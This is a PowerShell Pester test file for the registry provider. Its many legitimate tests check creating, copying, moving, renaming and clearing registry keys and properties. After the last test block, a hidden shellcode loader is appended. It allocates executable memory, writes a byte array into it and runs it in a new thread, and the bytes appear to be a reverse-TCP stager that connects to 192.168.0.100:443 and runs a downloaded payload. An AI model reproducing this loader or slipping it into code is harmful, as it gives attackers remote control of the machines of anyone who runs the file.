

try {
    
    $defaultParamValues = $PSdefaultParameterValues.Clone()
    $PSDefaultParameterValues["it:skip"] = !$IsWindows

Describe "Basic Registry Provider Tests" -Tags @("CI", "RequireAdminOnWindows") {
    BeforeAll {
        if ($IsWindows) {
            $restoreLocation = Get-Location
            $registryBase = "HKLM:\software\Microsoft\PowerShell\3\"
            $parentKey = "TestKeyThatWillNotConflict"
            $testKey = "TestKey"
            $testKey2 = "TestKey2"
            $testPropertyName = "TestEntry"
            $testPropertyValue = 1
            $defaultPropertyName = "(Default)"
            $defaultPropertyValue = "something"
            $otherPropertyValue = "other"
        }
    }

    AfterAll {
        if ($IsWindows) {
            
            Set-Location -Path $restoreLocation
        }
    }

    BeforeEach {
        if ($IsWindows) {
            
            Set-Location $registryBase
            New-Item -Path $parentKey > $null
            
            Set-Location $parentKey
            New-Item -Path $testKey > $null
            New-Item -Path $testKey2 > $null
            New-ItemProperty -Path $testKey -Name $testPropertyName -Value $testPropertyValue > $null
        }
    }

    AfterEach {
        if ($IsWindows) {
            Set-Location $registryBase
            Remove-Item -Path $parentKey -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context "Validate basic registry provider Cmdlets" {
        It "Verify Test-Path" {
            Test-Path -IsValid Registry::HKCU/Software | Should -BeTrue
            Test-Path -IsValid Registry::foo/Softare | Should -BeFalse
        }

        It "Verify Get-Item" {
            $item = Get-Item $testKey
            $item.PSChildName | Should -BeExactly $testKey
        }

        It "Verify Get-Item on inaccessible path" {
            { Get-Item HKLM:\SAM\SAM -ErrorAction Stop } | Should -Throw -ErrorId "System.Security.SecurityException,Microsoft.PowerShell.Commands.GetItemCommand"
        }

        It "Verify Get-ChildItem" {
            $items = Get-ChildItem
            $items.Count | Should -BeExactly 2
            $Items.PSChildName -contains $testKey | Should -BeTrue
            $Items.PSChildName -contains $testKey2 | Should -BeTrue
        }

        It "Verify Get-ChildItem can get subkey names" {
            $items = Get-ChildItem -Name
            $items.Count | Should -BeExactly 2
            $items -contains $testKey | Should -BeTrue
            $items -contains $testKey2 | Should -BeTrue
        }

        It "Verify New-Item" {
            $newKey = New-Item -Path "NewItemTest"
            Test-Path "NewItemTest" | Should -BeTrue
            Split-Path $newKey.Name -Leaf | Should -BeExactly "NewItemTest"
        }

        It "Verify Copy-Item" {
            $copyKey = Copy-Item -Path $testKey -Destination "CopiedKey" -PassThru
            Test-Path "CopiedKey" | Should -BeTrue
            Split-Path $copyKey.Name -Leaf | Should -BeExactly "CopiedKey"
        }

        It "Verify Move-Item" {
            $movedKey = Move-Item -Path $testKey -Destination "MovedKey" -PassThru
            Test-Path "MovedKey" | Should -BeTrue
            Split-Path $movedKey.Name -Leaf | Should -BeExactly "MovedKey"
        }

        It "Verify Rename-Item" {
            $existBefore = Test-Path $testKey
            $renamedKey = Rename-Item -path $testKey -NewName "RenamedKey" -PassThru
            $existAfter = Test-Path $testKey
            $existBefore | Should -BeTrue
            $existAfter | Should -BeFalse
            Test-Path "RenamedKey" | Should -BeTrue
            Split-Path $renamedKey.Name -Leaf | Should -BeExactly "RenamedKey"
        }
    }

    Context "Valdiate basic registry property Cmdlets" {
        It "Verify New-ItemProperty" {
            New-ItemProperty -Path $testKey -Name "NewTestEntry" -Value 99 > $null
            $property = Get-ItemProperty -Path $testKey -Name "NewTestEntry"
            $property.NewTestEntry | Should -Be 99
            $property.PSChildName | Should -BeExactly $testKey
        }

        It "Verify Set-ItemProperty" {
            Set-ItemProperty -Path $testKey -Name $testPropertyName -Value 2
            $property = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $property."$testPropertyName" | Should -Be 2
        }

        It "Verify Set-Item" {
            Set-Item -Path $testKey -Value $defaultPropertyValue
            $property = Get-ItemProperty -Path $testKey -Name $defaultPropertyName
            $property."$defaultPropertyName" | Should -BeExactly $defaultPropertyValue
        }

        It "Verify Set-Item with -WhatIf" {
            Set-Item -Path $testKey -Value $defaultPropertyValue
            Set-Item -Path $testKey -Value $otherPropertyValue -WhatIf
            $property = Get-ItemProperty -Path $testKey -Name $defaultPropertyName
            $property."$defaultPropertyName" | Should -BeExactly $defaultPropertyValue
        }

        It "Verify Get-ItemPropertyValue" {
            $propertyValue = Get-ItemPropertyValue -Path $testKey -Name $testPropertyName
            $propertyValue | Should -Be $testPropertyValue
        }

        It "Verify Copy-ItemProperty" {
            Copy-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2."$testPropertyName" | Should -BeExactly $property1."$testPropertyName"
            $property1.PSChildName | Should -BeExactly $testKey
            $property2.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify Move-ItemProperty" {
            Move-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction SilentlyContinue
            $property1 | Should -BeNullOrEmpty
            $property2."$testPropertyName" | Should -BeExactly $testPropertyValue
            $property2.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify Rename-ItemProperty" {
            Rename-ItemProperty -Path $testKey -Name $testPropertyName -NewName "RenamedProperty"
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey -Name "RenamedProperty" -ErrorAction SilentlyContinue
            $property1 | Should -BeNullOrEmpty
            $property2.RenamedProperty | Should -BeExactly $testPropertyValue
            $property2.PSChildName | Should -BeExactly $testKey
        }

        It "Verify Clear-ItemProperty" {
            Clear-ItemProperty -Path $testKey -Name $testPropertyName
            $property = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $property."$testPropertyName" | Should -Be 0
        }

        It "Verify Clear-Item" {
            Set-ItemProperty -Path $testKey -Name $testPropertyName -Value $testPropertyValue
            Set-Item -Path $testKey -Value $defaultPropertyValue
            Clear-Item -Path $testKey
            $key = Get-Item -Path $testKey
            $key.Property.Length | Should -BeExactly 0
        }

        It "Verify Clear-Item with -WhatIf" {
            Set-ItemProperty -Path $testKey -Name $testPropertyName -Value $testPropertyValue
            Set-Item -Path $testKey -Value $defaultPropertyValue
            Clear-Item -Path $testKey -WhatIf
            $key = Get-Item -Path $testKey
            $key.Property.Length | Should -BeExactly 2
        }

        It "Verify Remove-ItemProperty" {
            Remove-ItemProperty -Path $testKey -Name $testPropertyName
            $properties = @(Get-ItemProperty -Path $testKey)
            $properties.Count | Should -Be 0
        }
    }
}

Describe "Extended Registry Provider Tests" -Tags @("Feature", "RequireAdminOnWindows") {
    BeforeAll {
        if ($IsWindows) {
            $restoreLocation = Get-Location
            $registryBase = "HKLM:\software\Microsoft\PowerShell\3\"
            $parentKey = "TestKeyThatWillNotConflict"
            $testKey = "TestKey"
            $testKey2 = "TestKey2"
            $testPropertyName = "TestEntry"
            $testPropertyValue = 1
        }
    }

    AfterAll {
        if ($IsWindows) {
            
            Set-Location -Path $restoreLocation
        }
    }

    BeforeEach {
        if ($IsWindows) {
            
            Set-Location $registryBase
            New-Item -Path $parentKey > $null
            
            Set-Location $parentKey
            New-Item -Path $testKey > $null
            New-Item -Path $testKey2 > $null
            New-ItemProperty -Path $testKey -Name $testPropertyName -Value $testPropertyValue > $null
            New-ItemProperty -Path $testKey2 -Name $testPropertyName -Value $testPropertyValue > $null
        }
    }

    AfterEach {
        if ($IsWindows) {
            Set-Location $registryBase
            Remove-Item -Path $parentKey -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context "Valdiate New-ItemProperty Parameters" {
        BeforeEach {
            
            Remove-ItemProperty -Path $testKey -Name $testPropertyName -Force -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path $testKey2 -Name $testPropertyName -Force -ErrorAction SilentlyContinue
        }

        It "Verify Filter" {
            { $result = New-ItemProperty -Path ".\*" -Filter "Test*" -Name $testPropertyName -Value $testPropertyValue -ErrorAction Stop } | Should -Throw -ErrorId "NotSupported,Microsoft.PowerShell.Commands.NewItemPropertyCommand"
        }

        It "Verify Include" {
            $result = New-ItemProperty -Path ".\*" -Include "*2" -Name $testPropertyName -Value $testPropertyValue
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify Exclude" {
            $result = New-ItemProperty -Path ".\*" -Exclude "*2" -Name $testPropertyName -Value $testPropertyValue
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey
        }

        It "Verify Confirm can be bypassed" {
            $result = New-ItemProperty -Path $testKey -Name $testPropertyName -Value $testPropertyValue -force -Confirm:$false
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey
        }

        It "Verify WhatIf" {
            $result = New-ItemProperty -Path $testKey -Name $testPropertyName -Value $testPropertyValue -whatif
            $result | Should -BeNullOrEmpty
        }
    }

    Context "Valdiate Get-ItemProperty Parameters" {
        It "Verify Name" {
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey
        }

        It "Verify Path but no Name" {
            $result = Get-ItemProperty -Path $testKey
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey
        }

        It "Verify Filter" {
            { $result = Get-ItemProperty -Path ".\*" -Filter "*Test*" -ErrorAction Stop } | Should -Throw -ErrorId "NotSupported,Microsoft.PowerShell.Commands.GetItemPropertyCommand"
        }

        It "Verify Include" {
            $result = Get-ItemProperty -Path ".\*" -Include "*2"
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify Exclude" {
            $result = Get-ItemProperty -Path ".\*" -Exclude "*2"
            $result."$testPropertyName" | Should -Be $testPropertyValue
            $result.PSChildName | Should -BeExactly $testKey
        }
    }

    Context "Valdiate Get-ItemPropertyValue Parameters" {
        It "Verify Name" {
            $result = Get-ItemPropertyValue -Path $testKey -Name $testPropertyName
            $result | Should -Be $testPropertyValue
        }
    }

    Context "Valdiate Set-ItemPropertyValue Parameters" {
        BeforeAll {
            $newPropertyValue = 2
        }

        It "Verify Name" {
            Set-ItemProperty -Path $testKey -Name $testPropertyName -Value $newPropertyValue
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $newPropertyValue
        }

        It "Verify PassThru" {
            $result = Set-ItemProperty -Path $testKey -Name $testPropertyName -Value $newPropertyValue -PassThru
            $result."$testPropertyName" | Should -Be $newPropertyValue
        }

        It "Verify Piped Default Parameter" {
            $prop = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $prop | Set-ItemProperty -Name $testPropertyName -Value $newPropertyValue
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $newPropertyValue
        }

        It "Verify WhatIf" {
            $result = Set-ItemProperty -Path $testKey -Name $testPropertyName -Value $newPropertyValue -PassThru -WhatIf
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $testPropertyValue
        }

        It "Verify Confirm can be bypassed" {
            $result = Set-ItemProperty -Path $testKey -Name $testPropertyName -Value $newPropertyValue -PassThru -Confirm:$false
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $newPropertyValue
        }
    }

    Context "Valdiate Copy-ItemProperty Parameters" {
        BeforeEach {
            
            Remove-ItemProperty -Path $testKey2 -Name $testPropertyName -Force -ErrorAction SilentlyContinue
        }

        It "Verify PassThru" {
            
            $property1 = Copy-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2 -PassThru
            $property2 = Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2."$testPropertyName" | Should -Be $property1."$testPropertyName"
            $property1.PSChildName | Should -BeExactly $testKey
            $property2.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify Confirm can be bypassed" {
            Copy-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2 -Confirm:$false
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2."$testPropertyName" | Should -Be $property1."$testPropertyName"
            $property1.PSChildName | Should -BeExactly $testKey
            $property2.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify WhatIf" {
            Copy-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2 -WhatIf
            { Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction Stop } | Should -Throw -ErrorId "System.Management.Automation.PSArgumentException,Microsoft.PowerShell.Commands.GetItemPropertyCommand"
        }
    }

    Context "Valdiate Move-ItemProperty Parameters" {
        BeforeEach {
            
            Remove-ItemProperty -Path $testKey2 -Name $testPropertyName -Force -ErrorAction SilentlyContinue
        }

        It "Verify PassThru" {
            $property2 = Move-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2 -PassThru
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property1 | Should -BeNullOrEmpty
            $property2."$testPropertyName" | Should -Be $testPropertyValue
            $property2.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify Confirm can be bypassed" {
            Move-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2 -Confirm:$false
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction SilentlyContinue
            $property1 | Should -BeNullOrEmpty
            $property2."$testPropertyName" | Should -Be $testPropertyValue
            $property2.PSChildName | Should -BeExactly $testKey2
        }

        It "Verify WhatIf" {
            Move-ItemProperty -Path $testKey -Name $testPropertyName -Destination $testKey2 -WhatIf
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey2 -Name $testPropertyName -ErrorAction SilentlyContinue
            $property1."$testPropertyName" | Should -Be $testPropertyValue
            $property1.PSChildName | Should -BeExactly $testKey
            $property2 | Should -BeNullOrEmpty
        }
    }

    Context "Valdiate Rename-ItemProperty Parameters" {
        BeforeAll {
            $newPropertyName = "NewEntry"
        }

        It "Verify Confirm can be bypassed" {
            Rename-ItemProperty -Path $testKey -Name $testPropertyName -NewName $newPropertyName -Confirm:$false
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey -Name $newPropertyName -ErrorAction SilentlyContinue
            $property1 | Should -BeNullOrEmpty
            $property2."$newPropertyName" | Should -Be $testPropertyValue
        }

        It "Verify WhatIf" {
            Rename-ItemProperty -Path $testKey -Name $testPropertyName -NewName $newPropertyName -WhatIf
            $property1 = Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction SilentlyContinue
            $property2 = Get-ItemProperty -Path $testKey -Name $newPropertyName -ErrorAction SilentlyContinue
            $property1."$testPropertyName" | Should -Be $testPropertyValue
            $property2 | Should -BeNullOrEmpty
        }
    }

    Context "Valdiate Clear-ItemProperty Parameters" {
        It "Verify Confirm can be bypassed" {
            Clear-ItemProperty -Path $testKey -Name $testPropertyName -Confirm:$false
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be 0
        }

        It "Verify WhatIf" {
            Clear-ItemProperty -Path $testKey -Name $testPropertyName -WhatIf
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $testPropertyValue
        }
    }

    Context "Valdiate Remove-ItemProperty Parameters" {
        It "Verify Confirm can be bypassed" {
            Remove-ItemProperty -Path $testKey -Name $testPropertyName -Confirm:$false
            { Get-ItemProperty -Path $testKey -Name $testPropertyName -ErrorAction Stop } | Should -Throw -ErrorId "System.Management.Automation.PSArgumentException,Microsoft.PowerShell.Commands.GetItemPropertyCommand"
        }

        It "Verify WhatIf" {
            Remove-ItemProperty -Path $testKey -Name $testPropertyName -WhatIf
            $result = Get-ItemProperty -Path $testKey -Name $testPropertyName
            $result."$testPropertyName" | Should -Be $testPropertyValue
        }
    }

    Context "Validate -LiteralPath" {
        It "Verify New-Item and Remove-Item work with asterisk" {
            try {
                $tempPath = "HKCU:\_tmp"
                $testPath = "$tempPath\*\sub"
                $null = New-Item -Force $testPath
                $testPath | Should -Exist
                Remove-Item -LiteralPath $testPath
                $testPath | Should -Not -Exist
            }
            finally {
                Remove-Item -Recurse $tempPath -ErrorAction SilentlyContinue
            }
        }
    }
}

} finally {
    $global:PSdefaultParameterValues = $defaultParamValues
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x64,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

